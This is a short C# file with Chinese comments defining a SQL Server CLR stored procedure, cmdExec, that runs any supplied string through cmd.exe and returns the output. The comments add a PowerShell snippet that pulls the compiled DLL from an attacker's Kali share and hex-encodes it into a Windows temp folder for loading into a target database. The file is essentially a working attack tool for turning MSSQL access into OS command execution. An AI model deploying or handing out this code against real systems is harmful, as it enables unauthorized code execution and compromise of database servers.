// 编译为 cmdExec.dll 文件

// 要将程序集 (cmdExec.dll) 转换为十六进制字符串, 我们使用以下 PowerShell 脚本 :
// $assemblyFile = "\\My-Kali-IP\visualstudio\Sql\cmdExec\bin\x64\Release\cmdExec.dll"
// $stringBuilder = New-Object -Type System.Text.StringBuilder 

// $fileStream = [IO.File]::OpenRead($assemblyFile)
// while (($byte = $fileStream.ReadByte()) -gt -1) {
//     $stringBuilder.Append($byte.ToString("X2")) | Out-Null
// }
// $stringBuilder.ToString() -join "" | Out-File C:\Windows\Temp\cmdExec.txt

using System;
using Microsoft.SqlServer.Server;
using System.Data.SqlTypes;
using System.Diagnostics;

public class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmdExec(SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
        SqlContext.Pipe.SendResultsStart(record);
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        SqlContext.Pipe.SendResultsRow(record);
        SqlContext.Pipe.SendResultsEnd();

        proc.WaitForExit();
        proc.Close();
    }
};